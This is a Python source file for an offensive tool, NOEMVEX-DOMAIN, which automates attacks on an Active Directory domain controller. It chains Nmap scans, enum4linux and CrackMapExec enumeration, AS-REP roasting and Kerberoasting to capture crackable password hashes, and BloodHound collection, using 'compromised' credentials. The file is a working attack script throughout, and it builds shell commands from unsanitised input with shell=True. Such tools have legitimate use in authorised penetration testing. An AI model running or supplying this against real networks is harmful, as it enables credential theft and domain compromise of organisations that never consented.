"""
NOEMVEX-DOMAIN v1.0 [RED EDITION]
Author: Emre 'noemvex' Sahin
Description: Advanced Active Directory Enumeration & Attack Automator.
             Integrates Nmap, Enum4linux, CrackMapExec, Impacket, and BloodHound.
"""

import argparse
import subprocess
import sys
import os
import shutil

# --- SECURITY CHECK: ROOT REQUIREMENT ---
if os.geteuid() != 0:
    print("\033[91m[!] CRITICAL: This tool requires ROOT privileges for network-level scanning.\033[0m")
    sys.exit(1)

# --- STANDARD UI CLASS (Unified Noemvex Design System) ---
class UI:
    PURPLE = '\033[95m'  
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    GREY = '\033[90m'
    END = '\033[0m'

    @staticmethod
    def banner():
        # Raw string (r"") 
        ascii_art = [
            r"███╗   ██╗ ██████╗ ███████╗███╗   ███╗██╗   ██╗███████╗██╗  ██╗",
            r"████╗  ██║██╔═══██╗██╔════╝████╗ ████║██║   ██║██╔════╝╚██╗██╔╝",
            r"██╔██╗ ██║██║   ██║█████╗  ██╔████╔██║██║   ██║█████╗   ╚███╔╝ ",
            r"██║╚██╗██║██║   ██║██╔══╝  ██║╚██╔╝██║╚██╗ ██╔╝██╔══╝   ██╔██╗ ",
            r"██║ ╚████║╚██████╔╝███████╗██║ ╚═╝ ██║ ╚████╔╝ ███████╗██╗  ██╗",
            r"╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝     ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝"
        ]
        
        print(f"{UI.GREEN}{UI.BOLD}")
        for line in ascii_art:
            print(line)
        print(f"               {UI.PURPLE}[ NOEMVEX DOMAIN V1.0 HUNTER EDITION ]{UI.END}\n")

class DomainHunter:
    def __init__(self, ip, domain, user=None, password=None):
        self.ip = ip
        self.domain = domain
        self.user = user
        self.password = password
        self.output_dir = f"ad_loot_{self.ip}"
        
        # Create Loot Directory
        os.makedirs(self.output_dir, exist_ok=True)
        print(f"{UI.GREEN}[+] Loot directory secured: {self.output_dir}{UI.END}")

    def check_dependency(self, tool):
        """Checks if a required tool is installed."""
        if shutil.which(tool) is None:
            print(f"{UI.RED}[-] Warning: {tool} is not installed or not in PATH.{UI.END}")
            return False
        return True

    def run_command(self, cmd, step_name):
        """Executes system commands with status logging and error handling."""
        print(f"{UI.BLUE}[*] Initiating: {step_name}...{UI.END}")
        print(f"{UI.GREY}>>> Executing: {cmd}{UI.END}")
        try:
            # shell=True is used carefully for redirection
            subprocess.run(cmd, shell=True, check=True, capture_output=False)
            print(f"{UI.GREEN}[+] {step_name} Completed Successfully.{UI.END}")
        except subprocess.CalledProcessError:
            print(f"{UI.RED}[-] Error: {step_name} failed or produced no output.{UI.END}")

    def phase_recon(self):
        """Phase 1: Network Discovery (Nmap)"""
        print(f"\n{UI.YELLOW}--- [ PHASE 1: NETWORK DISCOVERY ] ---{UI.END}")
        if self.check_dependency("nmap"):
            cmd = f"nmap -n -Pn -sV --script 'smb-enum*,ldap*,krb5*' -p 53,88,139,389,445,464,593,636,3268,3269 {self.ip} -oN {self.output_dir}/nmap_ad_scan.txt"
            self.run_command(cmd, "AD Port & Script Scan")

    def phase_enum(self):
        """Phase 2: User & Share Enumeration (Enum4linux & CME)"""
        print(f"\n{UI.YELLOW}--- [ PHASE 2: USER & SHARE ENUMERATION ] ---{UI.END}")
        
        if self.check_dependency("enum4linux"):
            cmd_enum = f"enum4linux -a {self.ip} > {self.output_dir}/enum4linux.txt"
            self.run_command(cmd_enum, "Enum4linux Scan")
        
        if self.check_dependency("crackmapexec"):
            cmd_cme = f"crackmapexec smb {self.ip} -u 'guest' -p '' --shares > {self.output_dir}/smb_shares_guest.txt"
            self.run_command(cmd_cme, "CrackMapExec Guest Share Check")

    def phase_attack_no_auth(self):
        """Phase 3: Exploitation without Credentials (AS-REP Roasting)"""
        print(f"\n{UI.YELLOW}--- [ PHASE 3: EXPLOITATION (NO AUTH) ] ---{UI.END}")
        
        if self.check_dependency("impacket-GetNPUsers"):
            print(f"{UI.YELLOW}[!] Attempting AS-REP Roasting (Kerberos Pre-Auth)...{UI.END}")
            # Standard Kali path for unix_users wordlist
            wordlist = "/usr/share/wordlists/metasploit/unix_users.txt"
            if os.path.exists(wordlist):
                cmd = f"impacket-GetNPUsers {self.domain}/ -no-pass -usersfile {wordlist} -dc-ip {self.ip} -format hashcat -o {self.output_dir}/asrep_hashes.txt"
                self.run_command(cmd, "AS-REP Roasting")
            else:
                print(f"{UI.RED}[-] Wordlist not found at {wordlist}. Skipping AS-REP.{UI.END}")

    def phase_attack_auth(self):
        """Phase 4: Authenticated Attacks (Kerberoasting & BloodHound)"""
        if self.user and self.password:
            print(f"\n{UI.YELLOW}--- [ PHASE 4: AUTHENTICATED ATTACKS ] ---{UI.END}")
            
            # 1. Kerberoasting
            if self.check_dependency("impacket-GetUserSPNs"):
                cmd_kerb = f"impacket-GetUserSPNs {self.domain}/{self.user}:{self.password} -dc-ip {self.ip} -request -o {self.output_dir}/kerberoast_hashes.txt"
                self.run_command(cmd_kerb, "Kerberoasting (TGS Extraction)")
            
            # 2. SMB Share Enum (Auth)
            if self.check_dependency("crackmapexec"):
                cmd_smb = f"crackmapexec smb {self.ip} -u {self.user} -p '{self.password}' --shares"
                self.run_command(cmd_smb, "Authenticated SMB Share Enumeration")
            
            # 3. BloodHound
            if self.check_dependency("bloodhound-python"):
                cmd_bh = f"bloodhound-python -u {self.user} -p '{self.password}' -d {self.domain} -c All -ns {self.ip} --zip -o {self.output_dir}"
                self.run_command(cmd_bh, "BloodHound Data Ingestion")
        else:
            print(f"\n{UI.RED}[!] Credentials missing. Skipping Phase 4.{UI.END}")

    def run(self):
        UI.banner()
        print(f"{UI.BOLD}Target IP:{UI.END} {self.ip} | {UI.BOLD}Domain:{UI.END} {self.domain}")
        self.phase_recon()
        self.phase_enum()
        self.phase_attack_no_auth()
        self.phase_attack_auth()
        print(f"\n{UI.GREEN}[√] OPERATION COMPLETE. DATA ARCHIVED IN: {self.output_dir}{UI.END}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="NOEMVEX-DOMAIN: AD Automation Suite")
    parser.add_argument('--ip', required=True, help='Domain Controller IP')
    parser.add_argument('--domain', required=True, help='Domain Name')
    parser.add_argument('--user', default=None, help='Compromised Username')
    parser.add_argument('--password', default=None, help='Compromised Password')
    
    args = parser.parse_args()
    hunter = DomainHunter(args.ip, args.domain, args.user, args.password)
    hunter.run()